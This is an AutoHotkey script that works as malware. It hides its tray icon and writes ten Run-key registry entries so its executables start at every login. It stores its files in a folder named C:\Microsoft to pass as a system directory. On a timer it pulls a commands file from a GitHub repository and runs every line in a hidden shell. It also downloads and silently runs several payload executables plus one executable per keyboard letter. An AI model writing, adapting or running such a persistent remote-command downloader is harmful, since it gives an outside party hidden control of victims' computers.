#SingleInstance Ignore
#NoTrayIcon

path := "C:\Microsoft"

runAllExes() {
    static lastRun := 0
    delay := 1000
    now := A_TickCount
    if (now - lastRun < delay) {
        return
    }

    global path

    if !DirExist(path)
        DirCreate(path)

    letters := ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z", "LButton", "RButton", "Delete", "Backspace", "Space"]
    
    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
    RegWrite '"C:\Microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
    RegWrite '"C:\Microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
    RegWrite '"C:\Microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
    RegWrite '"C:\Microsoft\Backspace.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate4"
    RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"
    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate6"
    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate7"
    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate8"
    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate9"

    last := ""
    try {
        last := FileRead("C:\Microsoft\last.txt")
    } catch {
    }
    output := path "\commands.txt"
    url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
    command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
    RunWait command, , "Hide"
    text := FileRead(output)
    MsgBox last "`n----------------`n" text
    if (last != text) {
        try {
            FileDelete "C:\Microsoft\last.txt"
        } catch {
        }
        FileAppend text, "C:\Microsoft\last.txt"
        lines := StrSplit(Trim(text), "`n")
        for index, line in lines {
            newCommand := 'cmd /c ' line
            Run newCommand, , "Hide"
        }
    }

    try {
        output := path "\payload.exe"
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/payload.exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        Run command, , "Hide"
        Run output, , "Hide"
        try {
            output := path "\payload2.exe"
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/payload2.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            Run command, , "Hide"
            Run output, , "Hide"
            try {
                output := path "\payload3.exe"
                url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/payload3.exe"
                command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
                Run command, , "Hide"
                Run output, , "Hide"
            } catch {
            }
        } catch {
        }
    } catch {
    }

    for letter in letters {
        output := path "\" letter ".exe"
        if !FileExist(output) {
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            Run command, , "Hide"
        }
        Run output, , "Hide"
    }
}

SetTimer runAllExes, -1000

return
